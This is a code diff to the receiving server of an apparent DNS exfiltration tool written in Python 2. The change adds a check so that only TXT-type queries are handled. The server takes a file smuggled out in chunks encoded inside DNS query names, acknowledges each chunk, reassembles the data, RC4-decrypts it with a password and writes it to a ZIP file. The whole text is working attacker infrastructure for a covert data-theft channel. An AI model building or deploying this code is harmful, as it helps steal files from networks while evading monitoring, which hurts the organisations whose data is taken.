@@ -130,58 +130,59 @@ if __name__ == '__main__':
 			request = DNSRecord.parse(data)
 			qname = str(request.q.qname)
 			#print color("[+] Received query: [{}] - Type: [{}]".format(qname, request.q.qtype))
-						
-			#-----------------------------------------------------------------------------
-			# Check if it is the initialization request
-			if qname.startswith("init."):
-				msg = decode(qname.split(".")[1])
-				
-				fileName = msg.split('|')[0]		# Name of the file being exfiltrated
-				nbChunks = int(msg.split('|')[1])	# Total number of chunks of data expected to receive
-				
-				# Reset all variables
-				fileData = ''
-				chunkIndex = 0	
-				
-				print color("[+] Receiving file [{}] as a ZIP file in [{}] chunks".format(fileName,nbChunks))
-				
-				reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)	
-				reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT("OK")))
-				udps.sendto(reply.pack(), addr)
-				
-			#-----------------------------------------------------------------------------
-			# Else, start receiving the file, chunk by chunk
-			else:
-				msg = qname[0:-(len(args.domainName)+2)] # Remove the top level domain name
-				chunkNumber, rawData = msg.split('.',1)
-				
-				#---- Is this the chunk of data we're expecting?
-				if (int(chunkNumber) == chunkIndex):
-					fileData += rawData.replace('.','')
-					chunkIndex += 1
-					progress(chunkIndex, nbChunks, "Receiving file")
-				
-				#---- Always acknowledge the received chunk (whether or not it was already received)
-				reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)	
-				reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT(chunkNumber)))
-				udps.sendto(reply.pack(), addr)
-				
-				#---- Have we received all chunks of data ?
-				if chunkIndex == nbChunks:
-					print '\n'
-					try:
-						# Create and initialize the RC4 decryptor object
-						rc4Decryptor = RC4(args.password)
-						
-						# Save data to a file
-						outputFileName = "./output/" + fileName + ".zip"
-						print color("[+] Decrypting using password [{}] and saving to output file [{}]".format(args.password,outputFileName))
-						with open(outputFileName, 'wb+') as fileHandle:
-							fileHandle.write(rc4Decryptor.binaryDecrypt(bytearray(decode(fileData))))
-							fileHandle.close()
-							print color("[+] Output file [{}] saved successfully".format(outputFileName))
-					except IOError:
-						print color("[!] Could not write file [{}]".format(outputFileName))
+			
+			if request.q.qtype == 16:	
+				#-----------------------------------------------------------------------------
+				# Check if it is the initialization request
+				if qname.startswith("init."):
+					msg = decode(qname.split(".")[1])
+					
+					fileName = msg.split('|')[0]		# Name of the file being exfiltrated
+					nbChunks = int(msg.split('|')[1])	# Total number of chunks of data expected to receive
+					
+					# Reset all variables
+					fileData = ''
+					chunkIndex = 0	
+					
+					print color("[+] Receiving file [{}] as a ZIP file in [{}] chunks".format(fileName,nbChunks))
+					
+					reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)	
+					reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT("OK")))
+					udps.sendto(reply.pack(), addr)
+					
+				#-----------------------------------------------------------------------------
+				# Else, start receiving the file, chunk by chunk
+				else:
+					msg = qname[0:-(len(args.domainName)+2)] # Remove the top level domain name
+					chunkNumber, rawData = msg.split('.',1)
+					
+					#---- Is this the chunk of data we're expecting?
+					if (int(chunkNumber) == chunkIndex):
+						fileData += rawData.replace('.','')
+						chunkIndex += 1
+						progress(chunkIndex, nbChunks, "Receiving file")
+					
+					#---- Always acknowledge the received chunk (whether or not it was already received)
+					reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)	
+					reply.add_answer(RR(request.q.qname, QTYPE.TXT, rdata=TXT(chunkNumber)))
+					udps.sendto(reply.pack(), addr)
+					
+					#---- Have we received all chunks of data ?
+					if chunkIndex == nbChunks:
+						print '\n'
+						try:
+							# Create and initialize the RC4 decryptor object
+							rc4Decryptor = RC4(args.password)
+							
+							# Save data to a file
+							outputFileName = "./output/" + fileName + ".zip"
+							print color("[+] Decrypting using password [{}] and saving to output file [{}]".format(args.password,outputFileName))
+							with open(outputFileName, 'wb+') as fileHandle:
+								fileHandle.write(rc4Decryptor.binaryDecrypt(bytearray(decode(fileData))))
+								fileHandle.close()
+								print color("[+] Output file [{}] saved successfully".format(outputFileName))
+						except IOError:
+							print color("[!] Could not write file [{}]".format(outputFileName))
 			
 	except KeyboardInterrupt:
 		pass
